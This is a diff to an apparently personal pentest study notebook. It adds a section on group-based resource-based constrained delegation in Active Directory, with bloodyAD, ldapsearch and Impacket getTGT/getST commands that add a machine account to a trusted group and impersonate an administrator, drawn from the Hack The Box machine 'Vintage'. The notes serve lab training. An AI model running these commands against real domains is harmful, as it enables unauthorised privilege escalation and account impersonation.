@@ -98,16 +98,49 @@ Unconstrained delegation stores reusable delegated TGTs on a trusted host after 
 > [!warning] 💡
 > RBCD changes directory state. Remove the delegation entry during clean-down and verify that the service account can no longer impersonate users to the target.
 
+## Group-based RBCD
+
+The direct `add rbcd` route is not the only shape an RBCD path can take. If BloodHound shows that a group is already present in the target computer's `AllowedToAct` relationship, and the current account can modify that group, add a controlled SPN-bearing computer account to the group instead:
+
+```bash
+KRB5_CONFIG=$BoxDir/notes/krb5.conf \
+KRB5CCNAME=$BoxDir/loot/$Username.ccache \
+  bloodyAD -d $Domain -u $Username \
+  -k ccache=$BoxDir/loot/$Username.ccache kdc=$BoxIP \
+  -H $FQDN -i $BoxIP \
+  add groupMember $DelegatedGroup '$MachineAccount'
+
+ldapsearch -Y GSSAPI -H ldap://$FQDN \
+  -b 'CN='$MachineAccount',CN=Computers,DC=vintage,DC=htb' \
+  -s base tokenGroups memberOf
+```
+
+Then renew the machine TGT and request the service ticket:
+
+```bash
+getTGT.py "$Domain/$MachineAccount:$MachinePassword" -dc-ip $BoxIP
+KRB5_CONFIG=$BoxDir/notes/krb5.conf \
+KRB5CCNAME=$BoxDir/loot/$MachineAccount.ccache \
+  getST.py -spn "cifs/$FQDN" -impersonate $AdminUser \
+  -k -no-pass -dc-ip $BoxIP "$Domain/$MachineAccount"
+```
+
+Vintage used this form: `DelegatedAdmins` was already trusted by DC01, `C.Neri_adm` could add `FS01$`, and `FS01$` was the S4U source. A user in the trusted group is not automatically a usable S4U source; the source account needs the appropriate SPN and secret.
+
 ## Gotchas
 
 - `bloodyAD set object` is easy to misuse because the RBCD attribute is a binary security descriptor. Prefer the dedicated `add rbcd` and `remove rbcd` commands.
 - Computer accounts include a trailing `$` in both LDAP and Kerberos identities.
 - A working ticket request can still fail at the next step if the target FQDN does not resolve locally.
 - Requesting a CIFS ticket and using it through SMB-backed Impacket tooling is the simplest proof path. Use the SPN for the actual service you need.
+- `KDC_ERR_BADOPTION` after a group change usually means the membership/token state or machine TGT is stale. Verify group membership and `tokenGroups`, then renew the TGT.
+- A group SID in `AllowedToAct` is a different write path from direct computer-object control. Modify the group and remove the temporary member during cleanup.
+- `Administrator` can return `STATUS_LOGON_TYPE_NOT_GRANTED` over the chosen service. Use another confirmed privileged target such as a Domain Admin user with the required logon type.
 
 ## Seen in
 
 - [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] -- GenericAll over DC01, COLTY machine hash, RBCD, and S4U2Proxy to domain Administrator
+- [[OSCP/BOXES/WRITE UPS/AD/Vintage|Vintage]] -- pre-created `FS01$` added to the trusted `DelegatedAdmins` group, then S4U2Proxy to `L.Bianchi_adm`
 
 ## Related stages
 
